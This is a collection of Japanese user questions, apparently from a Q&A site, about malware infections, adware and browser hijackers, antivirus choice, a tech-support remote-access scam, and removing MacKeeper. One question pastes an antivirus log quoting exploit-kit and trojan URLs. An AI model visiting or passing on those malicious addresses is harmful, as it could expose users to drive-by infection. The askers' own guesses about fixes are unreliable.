windows 7 のＰＣを利用しています。 先日からマルウェアらしき症状が見られ、マルウェア駆除ソフトなどを使いながら様子を見たのですが、そろそろ一度リカバリをしようと考えています。 方法などをインターネットや説明書から調べているのですが、疑問に思ったことがあるのでお尋ねします。 ①リカバリ前にデータのバックアップを取る予定ですが、マルウェアやウィルスが一緒にバックアップされてしまうことはありますか？ ②もしマルウェアがバックアップされてしまった場合、リカバリ後にデータを復元するとＰＣが感染してしまうのでしょうか？ ③オフィス2010 を利用しているのですが、保管してある備品の中にCDやＩＤ番号などが見つかりません。初めからついていないものなのでしょうか？ もしご存知のかたがいましたら、教えていただければと思います。 最後に、リカバリ後に新しいセキュリティソフトの導入を考えていますが、おすすめのものはありますか？(有料無料問わず) どうぞ、よろしくお願いいたします。
預かりもののUSBメモリを、私のパソコンのウイルス対策ソフトで検査したら、「感染　Gen:Variant.Symmi.54852　削除しました」と出ました。 預かる前にも、先方のパソコンでウイルス検査してもらった時は「安全です」の表示だったのに。 私のパソコンが、「Gen:Variant.Symmi.54852」というウイルスに感染しているってことでしょうか？ 「Gen:Variant.Symmi.54852」って何なのか、ご存知の方いらっしゃいませんか？
google Chromeを使っています。 つい最近になっておかしな症状が出るようになりました。 例えば、グーグルで検索します。上位に画像検索結果が表示されることがあると思いますが、“○○の画像検索結果”をクリックすると画像ではなく詐欺サイトのような所に飛ばされます。 ウィルスか何かでしょうか？ 対策はどのようにしたら良いのでしょうか？
ノートPC、Windows7です。 以前、Google Chromeにて、ＹＯＵＴＵＢＥが見れなくなったり、ＤＭＭのゲームが出来なくなったりと、ちょっとおかしくなりまして。 検索してみたら、「まずは、アップデートされてるか確認しましょう」とあり、さっそく確認したら、「アップデートは管理者によって無効になっています。」と出ました。 その為、下記のサイト通りに解決させ、 http://www.teradas.net/archives/16840/ ちょっとおかしくなっていた問題もまとめて、無事解決しました。 その半月後、なんとなくアップデートされているか確認したら、また「アップデートは管理者によって無効になっています。」と出ていました。なのでまた、さきほどのリンク先の通りに解決させました。 が、なんか今後も出てくるような気がしています…。 ちなみに、Google Chromeが最新版になってるかなー？と確認しにいくと、必ずMSEから「脅威がありました処理中です」と反応があります。 1回目に出てきた脅威と、半月後の脅威、どちらも共通して以下と表示されていました。 【BrowserModifier:Win32/CouponRuc】 （このプログラムは、適切な承認なしに、さまざまなWebブラウザー設定を変更します。） もしかしてこれを解決させないと、また何度もアップデートが無効になるのかな？？？、と思い、解決策を検索してみたのですが、 検索結果が英語ばかりで、ここでお手上げ状態になりました。 もともと知識も浅いです。検索して解決するような感じで…。 質問です。 １．【BrowserModifier:Win32/CouponRuc】を消す、今後でなくする、方法がよく分かりません。方法を分かるだけ教えてください。 ※先ほど貼ったリンク先の下の方で、「その後しばらくすると以下のエラーが出て再び更新できなくなる場合があります」と説 明がありましたが、そのようなエラーは出ていないので、私は該当していないと思うのですが…。それでも、その解決方法を行えば、今回の【Browser～】は解決するのでしょうか？ ２．【BrowserModifier:Win32/CouponRuc】は「さまざまなWebブラウザー設定を変更します」とあったのですが、Google Chromeのアップデート以外に変更されてるものの予想はつくのでしょうか。私が気付いているのはアップデートについてだけですが。他は何か変更されてるのかな？と分からない状態です。 １の質問メインで、どなたかお願いします。
無料のセキュリティソフトをダウンロードの為、今PCに入ってるセキュリティソフトを削除したい、例えばウイルスバスタークラウドが入ってるあとどんな名が有るのかな
windows７です。どういうことかわからないです。 ウイルスソフトをアバストとMSEを使っていました。MSEは停止していました。 シャットダウンしようとしたら黄色いマークが出てました。 シャットダウンしたら１個インストール中となったんですが全く完了しませんでした。１５分以上かかっていたと思います。 電源ボタンを長押しして強制的にきってもういっかいつけたら、やはり黄色いマークがついてました。 そこでウイルスソフトを２つ常駐しているのは不具合がでると聞いたことがあるのでMSEをアンインストールしました。それでもういっかいシャットダウンしたら直ぐに完了しました。 PCを起動してwindows updateの履歴を見たら Definition Update for Windows Defenderー成功 windows１０アップグレードー失敗 となっていました。 たしかにwindows１０のアイコンはタスクバーにあります。ですがわけわかりません。MSEをアンインストールしたのがよかったのでしょうか？あと今年の１月までwindows updateの履歴を見てもDefinition Update for Windows Defenderというのは初めてでました。 どういうことなんでしょうか？ よろしくお願いします。
こんにちわ。 るるかです。 質問です。 チャットをやってたらいつかウイルスに感染するかを 聞きたいです。 よければ回答お願いします。
360セキュリティとゆうのをインストールしたんですが、ウイルス対策ソフトとゆうのはインストールするだけで、何も操作することなく、守ってくれるもんなんですか?よろしくお願いします!
gooページを開くと「gooトップページをスタートページに設定しよう！」が出て、×を押して消してもしつこく何回も出てきます。　これはウィルスでしょうか？　ウィルススキャンでは問題は検出できませんでした。　出なくする方法はないでしょうか？
ウインドウズ10が入手できません。 １．無償アップグレードを予約。 ２．タスク バーの右端に表示される小さな Windows アイコン確認。 ３．「お使いのメール アドレスの確認」のメール到着。 ここまではきましたが、「４．メール アドレスが本人のものであることを確認。」の自分のメールアドレスをクリックすると「リンクが無効になっています。メールで受信したリンクは有効期限が切れているか、既に使われています。引き続き、メール アドレスを確認するには、Microsoft アカウントで別の確認メールをリクエストしてください」と出てこの先がどうしていいかわかりません。 「Microsoft アカウントで別の確認メールをリクエストしてください。」とは、どうすればいいのですか。いろんな方法で試しているのですが・・・。どなたか教えてください。
先日、アンドロイドのタブレットを購入しました。 お恥ずかしいことに私自身、タブレット等の機械に詳しくなく、アプリの安全性や権限など確認せずにいくつかアプリをインストールしてしまいました。 色々調べていたところ、権限は確認すべきと知り、インストールしたアプリを確認すると、明らかにそれらの情報が必要のないアプリで、連絡先や端末のステータスやIDへのアクセス権限を提示しているアプリもインストールしてしまっていることが分かり、怪しいと思うアプリはアンインストールしました。 その後タブレットを操作していると、 「共通データ・サービス」 という覚えのないアプリがありました。 黒い背景に青い触覚のあるキャラクターがウインクしているアイコンです。 このアプリについてご存知の方、ご教示ください。 これは元々アンドロイドタブレットに内蔵されているアプリでしょうか？ 確認すると、アンインストールはできないのか、強制停止しか選ぶことができません。 端末のステータスや連絡先といった情報への許可や、画面ロックの無効化、電話番号発信といったことにも許可をしているので不安になってしまいました。 確認せずに色々なアプリをインストールしてしまったことで、知らないうちに危険なアプリをインストールしてしまったのではと危惧しています。 本当に無知であるため、質問内容が分かりにくいかもしれませんが、どなたか詳しい方やご存知の方いらっしゃいましたら、よろしくお願い致します。
私の勤めている会社では、ある種の情報を他の会社とUSBメモリでやりとりしているのですが、やりとりをするたびにUSBメモリ１本ずつにクイックフォーマットをかけ、２台のＰＣでそれぞれに１つずつインストールされたウイルス対策ソフト（ESET Endpoint Antivirusとウイルスバスタークラウドです）でウイルスチェックをしております。 １本ずつ、フォーマットして２台のＰＣでチェックしているので、ＵＳＢがたくさんあるときは、なかなかの時間がかかってしまいます。 こうしたフォーマット、ウイルスチェックの処理を迅速にする方法はありますか？ ＰＣ自体、スペックが低いのか、USBの差込口が２つしかなく（しかも、そのうちの１つはマウスに使っている）、２本差していても１本ずつしかフォーマットできないようなのですが、ＰＣのスペックが上がればUSBを同時に何本か処理できるようになるのでしょうか。
Thinkpad X60、Win7を使用しています。昨日の事でした。セキュリティーにKingsoftのFree版を導入していますが、ウィルス発見時、小さなウインドウで、警告のようなモノが出ます。常は画面通りにクリックして進めて行くと、そのままウィルスは隔離され、除去されるようなんですが、昨日は少し様子が違い、いくらクリックしても消えそうになく、ちょうどリンクが見当たりましたので、クリックすると、"無償で駆除するので連絡するように"との主旨が書いてあり、どうしようもないので、電話をかけてみました。女性が出たのですが、どうも日本語がカタコトのようで、「詐欺ならキレてやろう」と決めていました。一応、メールアドレスを教え、相手から送って来たメールにリンクすると、カーソルが勝手に動き出し、リモートコントロール、遠隔操作をされました。聞いていると"「ゴミが溜まっている」のでどうのこうの"、"確認するのは無料だがどうのこうの"と言われ、(金を取る気だな)と判断し、「そんな事は関係ないやろ。そりゃゴミも溜まるわい。皆そうやないのか?」とグチャグチャ言うと、失礼にも電話を一方的に切りやがりました。「なんじゃい、このアホは」と腹の虫も納まりませんでしたが、しかしながらメールアドレスを教えたのも事実、あのままではどうしようもなかった事も、また事実。遠隔操作されたのも事実なんですが、このまま使用していても大丈夫でしょうか?電話番号は控えてあります。いざ、何かあれば関係なくとも連絡しようとは思っているのですが?
私は前にパソコンを使っていると「あなたのパソコンがウイルスにやられています。今すぐダウンロードしてください。」というのが出てきていそいでMacKeeperインストールをしてしまいました。 その時に一緒にjustcloudというのにも登録してしまいました。 MacKeeperを進めていくと深刻でお金がかかるとわかったので無料のものはないかと探しているとMacKeeperがあまり良くないという記事を何件も見つけたのでアンインストールしようと思ったのですが調べてみるとファインダーのアプリケーションからゴミ箱に入れようとけせるらしいのですが私のアプリケーションにはなかったので探してみると、ロケットのような灰色のやつを押しと見つけることができたので、ゴミ箱に入れようとしましたが跳ね返ってきて消せません。 長押しして見ても上に×が出てきません。justcouldも同じでした。 他にも色々と調べて見たのですが… MacKeeperを消去する方法です。 1. これらをゴミ箱に入れる。### これは必ずゴミ箱に入れること。 /Applications/MacKeeper $HOME/Library/Application Support/MacKeeper ### $HOME/Library/LaunchAgents/com.zeobit.MacKeeper.Helper ### $HOME/Library/LaunchAgents/com.zeobit.MacKeeper.plugin.Backup.agent ### 2. restart # これでMacKeeperは動かなくなりますので/Applications/MacKeeperも消せる筈です。   3. これらをゴミ箱に入れ消去する。 $HOME/Library/Logs/MacKeeper.log $HOME/Library/Caches/com.zeobit.MacKeeper $HOME/Library/Caches/com.zeobit.MacKeeper.Helper $HOME/Library/Preferences/com.zeobit.MacKeeper.plist $HOME/Library/Preferences/com.zeobit.MacKeeper.Helper.plist   6. Keychain Accessを起動してLogin, System, System RootにMacKeeperかZeobitがあったら消去する。 7. Activity Monitorを起動してAll ProcessesにしMacKeeperかzeobitがついたProcessが無いか確認する。 8. Restart   Finderの移動を選びOptionを押すとライブラリを表示しますのでそこから辿って下さい。$HOMEはあなたのHomeと同じ意味です。 というのを見つけたのですが、意味が全然わかりません。 できれば画像つきで教えて欲しいです… これの他にも消す方法があるなら教えてください。 あと、もし消すことができたとしても深刻な状態と言われたまま放置して良いのでしょうか。 どうかよろしくお願いします。
ダウンロード3年版で安いキャンペーン中に購入したいけど、今まで使っているものの期限が残っていたら使い切ってから、購入済のダウンロード版に新しいシリアルキーを入力して使うことは出来るのでしょか？
PCから電話番号にメールを送ることってできますか？ 相手はソフトバンクです。 できたら完全に無料のがいいですが、 私から送るのは無料で相手からってのは有料って言うタイプのでもいいです！ いいのがあればおしえてください
Free Video Converterをインストールしたいのですが、インストーラエラーになります。そこで色々調べたのですが、ある人はNTTのセキュリティソフトでブロックされていたとありました。そこで自分もウイルスソフトを入れてるのでそれが原因ではないかと思いました。自分が使ってるのは、ESET パーソナル セキュリティです。このソフトでブロック解除をしたいのですがやり方が分かりません。教えてください。
昨夜ＰＣ使用中に、音声で、「ウイルスに感染した可能性があります。個人情報が盗まれた可能性があります。クレジットカードやネットショッピングは使用しないで下さい」がエンドレスで出てきました。映像上も数行のアラームが出てきました。マイクロソフト社のアラームではなかったかと思います（定かではないです）。音声でのアラームは初めてでしたので驚き取りあえずＰＣは切りました。 さて、このアラームは信頼できるのか？だとすればウイルスに感染したかどうかはどう判別するのか？どのような対策を取ったらいいのか？どなたか教えて頂けませんか？
ＰＣがやたらと重かったので再インストールをしました、 しかし起動のための時間は再インスト前の遅い時そんなに変わりません、買いたてのころはすぐ起動したのに、 起動後にＰＣの読み込みランプ（？）が５分くらいずーっとつきっぱなしでカリカリ何かを読んでいます、 そしてシャットダウンの時は何も開いてないのに必ずこの画面がでます↓ https://d1v9c5y32oxrkp.cloudfront.net/oshietegoo … これって何かのウイルス的なものなのでしょうか？ 再インストールしたのに立ち上げが重くてしょうがないです、どなたか詳しい方お助けください。
至急お願いします。乱文ごめんなさい。 パソコンがウイルス感染していて Nortonで駆除してもらおうと口座を入力し購入した際にこの画面になってしまいました。 どこのキーを触っても動きません。 口座は念のため止めたのですが、パソコンをどうやったら直せるでしょうか… またその後どうしたらいいでしょうか。 よろしくお願い致します。
もしウイルスがあるサイトの画像をgoogleで調べて。google で出てきた画像を見ても感染しないんですか
朝起きると、付けっぱなしのPCのブラウザに多量の広告(？)タブが開かれていました。 おそらくですが、原因のexeはすぐに特定でき、 コントーロールパネルのプログラムと機能から、「FreeSoftToday」の削除、 タスクマネージャーから、プロセス名「fst_jpなんちゃら」停止、 ファイル名検索から、「fst_jpなんちゃら」(複数)の削除、 の処置を取りました。 現在の所、広告 (と言うよりいかにも詐欺くさい警告) のブラウザタブは開かれなくなったのですが、 削除したマルウェアプログラムの全ては、日付が寝てる最中だったのです。 こうなってくると、他のプロセスが走っていて、勝手に寝てるときにインストールされた気がしてなりません。 それの特定をしたいのですが、心当たりや同じ経験をした方はいらっしゃいませんでしょうか。
パソコンを買い換えまして、これまで使っていたウィルスバスター月額版を今度のパソコンで使いたいのですが、どのようにすればよいのでしょうか？教えてください。
ウィルスバスターを10年ぐらい使っています。 海外の怪しげなサイトを良く見ます。 （ただしその先、有料部分には行きません。信頼できないサイトでカード情報なんて恐ろしくて書けません。） ウィルスバスターは動作がとても重いと感じていますが、家でほかのセキュリティソフトを使ったことがないので変える決意ができないでいます。 ESETはとても軽いと聞いています。 またカスペルスキーも性能が良いと聞いています。 ノートンはいやです。（高いし重い・・・会社で使っている。） 海外工口サイトに強いセキュリティソフトはなにですか。
『教えてgoo』を開いた際、必ず『セキュリティ警告』っていうのが表示されます。大丈夫でしょうか…?
マカフィーインストールしていますが、最近少し変です。 ieが点滅するように変になる、入力している途中でアクティブ状態が解除される、 突然コマンドプロンプトのようなプログラム画面が２、３秒でるが何やってるかわからない。 パソコンふるスキャンしても何も検出されませんが、何か異常なようです。 どうしたらいいでしょうか？よろしくお願いします。
有線1台、無線3台を接続中、今までバスターを使用していました。このたび無線の1台（ＸＰ）をリカバリーした所、バスターを再ダウンロードできませんでした。このＸＰは古いのでウィルスにやられ壊れてもいいのですが、無線を使用しているため他のパソコンに影響が出ることはあるでしょうか。更にここで教えてもらったＡＶＧと言うアンチウィルスは現在もＸＰで使用可能らしいですが、これではダメでしょうか。
アダルトサイトでのダイヤルアップ詐欺らしき感じのものを見たんですが ADSLも電話線使ってますが、大丈夫なんでしょうか？
こんばんは。Outlook2013を主にしてメールを使用しているのですが、他にもエキサイト、goo とメールを使っています。重要なのはOutlookで、買い物などの連絡は他のアドレスを使用しております。ただ、セキュリティソフトが働いているのはOutlookだけです。エキサイトやgooなどのメールをOutlookに転送させているのですが、ここでは転送されるメールにはセキュリティが機能しているのでしょうか？転送させているのは、一つで管理できるというのもありますがセキュリティにもかけられるので安心だという思いもあります。自分の考えは正しく、セキュリティのチェックにかけられているのでしょうか？お詳しい方、よろしくお願い致します。
某所で私物パソコンを無線で使用していました。他所から異常な発信数を受けた（ＨＰが開けなくなった）と言ってきました（発信元はこのＩＰアドレスですが、無線ルーターのため他の方も使用中です）しかし私のパソコンから発信されたと思うのは攻撃を受けた相手はこのパソコンにある相手だからです（以前家人がそこに送信していました）。他人が私のパソコンを乗っ取りそこから攻撃をしたのか？と推測していますが、不明です。これ以後パソコンは無線offにして、microsoftのネットoffで使用できるウィルス駆除もしましたが、何も出ませんでした。今後このパソコンでネット使用した場合、また同様な事が起こるのか？思えば接続できません、どうしたらいいでしょうか、もちろんウィルスバスターは入れていました、自分でもう一度チェックするか、パソコンショップなどで駆除した方がいいでしょうか。 パソコンの内容などから捨てがたいのですが・・
家にパソコンが２台あります。 １台は私のパソコンで、マカフィーのインターネット・セキュリティ（３台用）が有効になっています。 もう１台は父親のパソコンで、マカフィーのセキュリティ（試用版）が、期限切れの状態です。 父親のパソコンのものも、有効にさせたいと思っています。 私のパソコンのマカフィーのマイホームネットワークを開くと、「新しいネットワークを検出しました。（ネットワークを信用し、ネットワークの内のパソコンとデバイスを確認して、マカフィー製品が実行されているセキュリティ問題を修復してください）」と表示されます。 ここで質問です。 ①「新しいネットワーク」とは何でしょうか？ 私と父親のパソコンは、１０年近く前からインターネットを利用しています。 ②「マカフィー製品が実行されているセキュリティ問題」の意味がよく分かりません。 「新しいネットワークの中でマカフィー製品が実行されているのが分かりました。けれどセキュリティ問題があるので修復してください。」という事ですか？
私は普段、google chromeを使っています。 そして、いつからか分かりませんがアドレスの入ったボタンみたいなやつにとべなくなりました。 　　　　　　　　　　　　　　　　　　　　　　　（登録開始！みたいのがあるやつ） そして、「アレ？おかしいな」と思い、新しいタブで開こうとしたらabout:blankと出てきました。 これの対処法を教えてください。色々調べてみたのですが、このようなものの対処法は あまり出てきていなかったので・・・お願いします。
スマホがウイルス感染したかもしれません。どうしたらいいでしょうか？ ウイルスに感染したパソコンからウィルスを削除後、スマホのＳＤカードをＵＳＢでパソコンに繋いだところ、削除しきれていないプログラムが出てきてしまいました。 そのプログラムをアドウェアを削除するフリーソフトで削除し、その後、ＳＤカードに音楽データを移したのですが、音楽データに悪いものがついていて、スマホが感染したりしますか？音楽データはネットから無料ダウンロードしたものです。結局、スマホに入れたその音楽データは削除しました。その後、無料アプリでスマホ内をスキャンしたら異常は見つからなかったのですが、初めてのことなのでとても不安です。 どなたかお力をお貸しください。 ちなみにスマホには特に不具合は出ていません。
ウイルスバスタークラウドで、ＰＣとスマホが同じシリアルＮＯで利用できますか？
家には、パソコンが２台あります。 １台は有線ＬＡＮ、もう１台は無線ＬＡＮで、インターネットにつながっています。 私のパソコンは無線ＬＡＮで、マカフィーのインターネット・セキュリティが有効な状態です。 ３台まで保護できるものです。 一方、父親のパソコンは有線ＬＡＮで、マカフィーのインターネット・セキュリティが有効期限切れです。 以前時々、私のパソコンに「ネットワークの中に、有効でないマカフィーのセキュリティ・ソフトがあります。有効にしますか？」みたいな警告がありました。 今は、ありません。 その時、やっておけば良かったと、後悔しています。 もう一度、その表示を出す方法はありますか？ 無理なら、なるべく簡単な方法で父親のパソコンも有効にしたいのですが、どうすれば良いですか？
PCを初期化してもウイルスが除去できないケースってありますか？ あるとすればどの部品を交換すれば良いのでしょうか？ メインボードが感染して交換しなければならないケースがあるらしいことは 知っていますが・・・その他に初期化しても交換しなければ無意味な部品などはありますか？
知らぬうちに、「internet speed tracker」なるものがインストールました。 おかしいことに気づき、まずこれをコントロールパネルからアンインストールしました。 検索してみると、asktoolbarとask.comも削除するように書かれています。 askが何であるか分からず、お尋ねします。 コンパネには見つからず、askを検索すると、たくさん引っかかりました。 その中に、どこにあるかは分かりませんが、ask.comが5個も見つかりました。 また、asktoolbarは見つかりません。 まずはこのask.comの5個は全部、削除してもよいでしょうか？ 単純に削除するのは問題有りとも考え相談します。 その他、削除してもいいのはどれでしょうか？ なお、環境はWin8.1です。 以上
A社とB社のアンチウイルスソフトの検索エンジンと定義ファイルが異なる場合、 両方使用した方がより検知の確立も上がると思うのですが、 共存したインストールが勧められない理由とは何なんでしょう？ お互いのソフトをウイルスと誤認するみたいな話を聞いた気がするのですが、 なぜ複数のアンチウイルスソフトを同じPCに入れてはいけないのか、 詳細をご存知の方がいたら教えてください。 理論的には同時に使用した方が良いのは間違いないと思います。 例えばルータの前後ににアンチウイルスのアプライアンスがあり、 クライアントにもアンチウイルスソフトがある場合、 ウイルスがすり抜ける率も下がると思うのでより強固なセキュリティと言えますが、 個人ではコスト的に見合いませんね。 もしPC内で複数のアンチウイルスを稼働させたら強固になるなら、 場合によっては検討の余地があると思ったので、 せめて2種類共存させても不具合が起きないような規格等があっても良いのではないかと。 いかがでしょう？
ウィルスバスターて無料ですか
最近自分のサイトをGoogle AdSenseに申請し許可されまして、早速広告を出したのですが、 ウィルスの広告がよくでます。 詳しく説明しますと、 このコンテンツを表示するにはjava12.3が必要です。今すぐアップデートしますか？　はい　いいえ 上記のように出てて、調べてみると ウィルスを自分でダウンロードさせようとするサイトのようです。 http://urashita.com/archives/594　←参考サイト これをなんとか無くしたいのですが、どうすればよろしいでしょうか？
私のパソコンはデスクトップのパソコンです。 ここ数日、キーボードを何も押していないのに「ｆ」のもじが勝手に連打されます。 どうしたらよいでしょうか？ キーボードの掃除以外で見当たる解答がありましたらお願いします。
今朝、急に「キングソフト」のアイコンが消えていました。復元方法をどなたかお教えください。
ある日いきなりブラウザ（firefox）上に、linkbucksという広告サイトやde comprasというサイト、さらに「ILIVID DOWNLOAD」というのがランダムで頻出するようになり（ページを移動する時やマウスをクリックするだけで）それどころかsteamというアプリにすらこれらが出現するようになり大変困っています。 最初はsteamというアプリに出て、次に規定ブラウザであったfirefoxに出始めるようになり 新しく入れたchrome、operaにも・・と続々と出現しています。ブラウザを入れなおしてもsteamのアプリを入れなおしても変わりはありませんでした。 ネットで検索すると「linkbucksの消し方」というページがあり、それに従ってYACというウイルス除去ツールの全機能を使ったのですが、どうやらそれすらも悪質だったようで改善は見られず（どうやらむしろスキャンやPC調整の時に情報を抜かれる仕様だったようで）危機に貧しながらも 他に良いという「hitman pro」や「msert」や「adaware」を使って何度も再起動しても当たり前のように出てくる状況です。 お手数ですが、何か良い手段がありましたら教えていただけると、天にも登るような気持ちです…
バカな事をしてしまいました。 今、うちでは無線 lan で3台のＰＣがネットを利用しています。それぞれのＰＣ間ではファイルやフォルダーの共有は一切していません。父親や兄たちが仕事によく使っていますが、それぞれのＰＣには最新のセキュリティソフトは入っていて、定期的にスキャンしています。 実は先日友人が知人を連れて遊びにきて、wi-fi を使わせてほしいと言ったので、ルーターに貼ってある暗号キーを教え、その知人は自分のスマホをうちの wi-fi につなぎました。ちなみに彼のスマホにはセキュリティソフトは何も入っていません。 古い友人の知人だからそれはいいのですが、私が部屋をあけているうちにアダルトサイトを開いて二人で喜んでいました。　ま、いいか、と思ったのですが、彼らが帰った後、急に心配になってきました。 というのが、よくあの手のサイトでは悪質なウィルスを仕込んでおき、動画を見ただけでウィルスが侵入してきて悪さをすると聞いています。　彼のスマホが壊れようが私には関係ないのですが、セキュリティソフトで保護されているといっても、うちのＰＣに影響ないのかどうか心配です。大丈夫でしょうか？ それと、彼のスマホがもし感染したとすれば、うちの無線のルーター自体に何か影響ないでしょうか？ うちではウィルス感染にとても神経質なのですが、友人のスマホがその後に感染したかどうか不明ですし、各ＰＣはセキュリティソフトで保護されていることを考えると、私は心配しすぎでしょうか？ 詳しいかた、お願いします。
突然PCが重くなりワードもまともに開きません。画面右下の警告でウイルスバスターが停止したのが判りました。バスターを起動させようとしましたが起動しない状態です。 外付のＨＤも感染したか判らないのですがウイルスバスターを入れてある他のPCでチェックするのは危険でしょうか？ やはりPCが突然重くなる等はウイルスの可能性が高いのでしょうかか？困ってます。 どなたか詳しい方がいらっしゃいましたらご指導よろしくお願いします。
最近、パソコンがウィルス感染したことによる個人情報が流出してしまう事故を多く聞きます。 自分のパソコンがウィルスに感染したかどうかを知るにはどうすれば良いのでしょうか？ ウィルスソフト（ウィルスバスター、マカフィーなど）でスキャンした際に、 ウィルスを検出した＝感染していた　ということになるでしょうか？ また、個人情報が流出したかどうかを知るにはどうすれば良いのでしょうか？ よろしくおねがいします。
只今ノートンセキュリティ2013のお試しを使ってますが スキャン後IEを開きますとヤフーの天気予報の地域を設定した地域が変わって表示されます。 またID・Passの必要なサイトの設定も消えています。 ノートンの場合スキャンするとこの様になるのでしょうか？ またノートン側で設定すれば上記で述べた様にならない事ができるのでしょうか？ できるとしたら設定方法を詳しく教えて頂きたいです。 お願いします。
購入、初期設定して間もないPCに ディスク版ではない、いわゆるダウンロード版のセキュリティソフトをインストールしようとしても まだセキュリティソフトが入っていない状態でネットワークを利用することで マルウェアが仕込まれる可能性はあるのでしょうか？
マイスタートサーチの消し方お教えてください
何度アンインストールしても 検索画面がmystearsarchに書き換えられ medeia player z のインストール画面が現れます。 ウィンドウズ７を使っています。 googlecrome,IEどちらとも書き換えられます。 何か良い方法はありませんか？
NewSaver の除去の方法を教えて下さい。
トレンドマイクロ社のウィルスバスタークラウドは、Windows10にも対応出来るのでしょうか？ パソコン初心者のため、ご存じの方わかりやすく教えて下さい。 よろしくお願いします。
一昨日からトロイが隔離されています。 ＥＳＥＴ使用、Ｗｉｎ7、ブラウザはＩＥ 不定期に（一日2～３回）気がつくと隔離されています。 数時間置きにＥＳＥＴとオンラインスキャンで検査をしますが、 特に何かを検出する事はありませんでした。 一度だけＰＣを起動した際にメモリ不足と出たので スキャンしたところ、トロイが検出されました。以下ログです。 2015/06/05 HTTP フィルタ ttp://bugco97vg82dupao9yjilfg.sigarabirakmailaci.org/RE1ADxcVTAJPVBMFU1sKARAFCAZXQxYDXw1KXA8OVlMdRQ8FUUZSVA8QUV9eVw8OUVdaGAkQVw.html JS/Kryptik.AVZ トロイの木馬 接続が切断されました - 隔離しました　 アプリケーションによるウェブへのアクセスにおいて脅威が検出されました : C:\Windows\explorer.exe. 2015/06/04 HTTP フィルタ ttp://tor.beersforsale.com/jNiU3wJshkzqITLw0NkNmqzxfDV7VHMbYgBeowH2070TlIa_.javabin SWF/Exploit.ExKit.AQ トロイの木馬 接続が切断されました - 隔離しました アプリケーションによるウェブへのアクセスにおいて脅威が検出されました : C:\Windows\System32\cmd.exe. 2015/06/04 　リアルタイムファイルシステム保護 C:\Users\＊＊\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\DRYN47LX\jNiU3wJshkzqITLw0NkNmqzxfDV7VHMbYgBeowH2070TlIa_[1].swf SWF/Exploit.ExKit.AQ トロイの木馬 削除されました - 隔離しました アプリケーションがファイルにアクセスしようとしたときにイベントが発生しました : C:\Windows\System32\cmd.exe. 2015/06/04　　リアルタイムファイルシステム保護 Ｃ:\Users\＊＊\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\LRRXHS0U\jNiU3wJshkzqITLw0NkNmqzxfDV7VHMbYgBeowH2070TlIa_[1].swf SWF/Exploit.ExKit.AQ トロイの木馬 削除されました (次回の再起動後) - 隔離しました アプリケーションによって新規作成されたファイルでイベントが発生しました : C:\Windows\System32\cmd.exe. 2015/06/04 詳細メモリ検査 システムメモリ > C:\Users\＊＊\AppData\Local\Temp\{A9251E59-3394-4511-A0E4-4E090761E9AE}\TMPDD5B.tmp Win32/Spy.Zbot.ACBの亜種 トロイの木馬 駆除されました - 隔離しました 長くなり申し訳ありません。 普段スキャンすると何も検出されないのですが、気がつくとログに残っています。 あと左下のウインドウズロゴからコンピューターでハードディスクドライブの 画面を開くのがかなり遅くなりました。 これは駆除しきれていない状態なのでしょうか。 そしてこれはリカバリーを必要とする状態なのでしょうか。
ウィルスセキュリティの検査で、「is an Adware(004c3ee1)」というものが検出され、 削除しても削除しても何度も出てきます。 セーフモードでも試しましたが、「削除できません」「隔離できません」と 表示されて、どうしたらいいのかわかりません。 これは危険なものなのでしょうか？ 復元やリカバリしか手立てはないのでしょうか。 どうか教えてください、よろしくお願いします。
お世話になります。 無料ソフトを自宅でも会社でも使うことが多いのですが、 この無料ソフトが何か悪さをしていないか、 例えば、外部に何かをネットワーク経由で送信していたり、 トロイ系を仕込んでいたりということをしていないかを調べる方法はないでしょうか？ 一応、Nortonを入れていますが、先般の年金の情報流出の話もありますし、 レアなソフトウェアですと、Nortonでも使用者の少ないソフトウェアという表示が出るのみで、 迷ってしまうことが多いので相談させて頂く次第です。 せめて外部に情報を流出させていないか、ネットワークに接続させていないかを 調べる方法はないでしょうか？ よろしくお願い致します。
ウイルス対策ソフトをパソコンからアンインストールしても問題ないと思いますか?ウイルス対策ソフト(ウイルスバスタークラウド)のせいで、パソコンのディスクが99%になることがあります。 ウイルスバスターを停止させると元に戻ります。明らかにウイルスバスターが原因です。
ノートンでソフトウエアを実行しようとすると 安全で無いと勝手に削除します。 ダウンロードしたソフトウエアは発行元は不明ですが 有名なところで問題はないと思います。 どうしたらソフトウエアを実行できるのでしょうか？
使用しているノートパソコンがマルウェアに感染している可能性があります。 　フリーソフトやjpg画像など、ダウンロードするもの全てがウイルススキャンに失敗等のメッセージが出て勝手に削除されてしまいます。また、定期的にウイルスソフトが"ウイルスを削除しました"とメッセージをポップアップしてきます。 　そのため一度パソコンのリカバリを行おうと考えたのですが、どうやらリカバリソフトが付属していなかったようで、リカバリすることができない状況です。 ウェブサイト上でのダウンロードも全て阻害されてしまい、手も足も出ない状況です。 　リカバリ以外の方法でマルウェアを駆除する方法はあるのでしょうか？ また、プログラムのアンインストールで全てのファイル等を削除しても、マルウェアは削除されませんか？ 　修理に出すことも考えましたが、それならば新しい製品に買い替えも検討しなければならないため、修理に出すことは考えていません。 使用しているパソコンは FRONTIER FRNP510 windows7　インテルcore i5-480M 上記になります。 　どなたか詳しい方がいらっしゃいましたら、ご教授お願いします。
chromeを使おうとダブルクリックして ブラウザを立ち上げると 以下のようなメッセージが表示されます。 ---------------------------------------------- 強制終了しました Chromeのメモリが不足せいているか、ウェブページのプロセスが何らかの 原因で終了しました。続行するには、ページを再読み込みするか別のページ に移動してください。 ---------------------------------------------- そこで再読み込みを試しましたが変化なし 別のページに移動しても変化なし ネットで調べるとchromeの設定をリセットすると改善するとのことで https://support.google.com/chrome/answer/3296214 ヘルプを参照したのですが、 そもそも設定のページも開けません。 PC内でブロックがかかっているのでしょうか？ アイコンに以前とはみなれぬあやしいマークがついています。 まず、これはどうしたら外れるのでしょうか？
※PC初心者です セキュリティソフトから「trojanを発見しました」という警告が何度も表示されるようになりました。 セキュリティソフトの方で該当ファイルの削除をしている様なのですが、ずっと警告→削除の繰り返しになってしまいます。 「Ski Search」というファイルが原因の様で、手動で削除しようとすると「リサイクル中」と表示されて削除することが出来ません。 セキュリティソフトの方でウイルススキャンすると、確かに感染ファイルがあり、削除しますか？と出るのですがやはり削除できていませんでした。 Ski Searchについても調べたのですが、海外のサイトばかりで「コントロールパネルからアンインストール」みたいなことが書いてあったのですが、翻訳がちんぷんかんぷんでわからず… どうしたらいいのでしょうか？ Windows7を使用しています。
